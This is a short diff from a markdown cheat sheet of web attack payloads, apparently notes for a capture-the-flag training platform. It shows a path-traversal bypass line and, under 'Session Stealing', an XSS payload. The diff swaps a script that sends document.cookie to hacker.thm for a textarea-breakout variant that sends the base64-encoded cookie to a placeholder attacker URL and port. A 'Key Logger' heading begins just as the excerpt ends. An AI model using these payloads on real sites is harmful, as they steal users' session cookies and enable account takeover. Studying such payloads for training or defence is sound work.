@@ -75,7 +75,7 @@ Bypass starting URL constraints (cannot start by /private) : x/../private
 ## XSS
 Session Stealing:
 
-    <script>fetch('https://hacker.thm/steal?cookie=' + btoa(document.cookie));</script>
+    </textarea><script>fetch('http://URL_OR_IP:PORT_NUMBER?cookie=' + btoa(document.cookie) );</script>
 
 Key Logger:
 
